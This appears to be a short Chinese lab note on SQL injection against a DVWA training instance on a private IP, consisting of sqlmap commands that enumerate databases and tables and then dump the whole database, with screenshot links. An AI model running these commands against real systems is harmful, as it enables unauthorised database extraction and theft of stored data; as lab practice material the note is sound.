## SQL注入


```sqlmap -u "http://192.168.213.136/vulnerabilities/sqli/?id=1&Submit=%E6%8F%90%E4%BA%A4#" --cookie="security=low; PHPSESSID=blmgf8bl931863uc8rf70jbfv0" --batch```
![avatar](/src/static/img/zhuru1.png)


```sqlmap -u "http://192.168.213.136/vulnerabilities/sqli/?id=1&Submit=%E6%8F%90%E4%BA%A4#" --cookie="security=low; PHPSESSID=blmgf8bl931863uc8rf70jbfv0" --dbs --batch```
![avatar](/src/static/img/zhuru2.png)


```sqlmap -u "http://192.168.213.136/vulnerabilities/sqli/?id=1&Submit=%E6%8F%90%E4%BA%A4#" --cookie="security=low; PHPSESSID=blmgf8bl931863uc8rf70jbfv0" -Ddvwa --tables --batch```
![avatar](/src/static/img/zhuru3.png)


### 拖库 慎用


```sqlmap -u "http://192.168.213.136/vulnerabilities/sqli/?id=1&Submit=%E6%8F%90%E4%BA%A4#" --cookie="security=low; PHPSESSID=blmgf8bl931863uc8rf70jbfv0" -Ddvwa --dump-all --batch```
![avatar](/src/static/img/zhuru4.png)
![avatar](/src/static/img/zhuru5.png)


